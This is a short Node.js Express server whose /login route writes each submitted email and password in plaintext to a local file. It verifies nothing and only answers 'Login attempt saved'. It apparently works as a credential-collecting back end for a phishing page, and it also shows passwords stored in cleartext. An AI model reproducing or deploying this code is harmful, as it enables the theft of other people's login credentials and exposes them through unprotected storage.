const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;

app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Save email and password to a file
    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile(path.join(__dirname, 'logins.txt'), data, (err) => {
        if (err) {
            console.error('Error saving login attempt:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.status(200).send('Login attempt saved');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
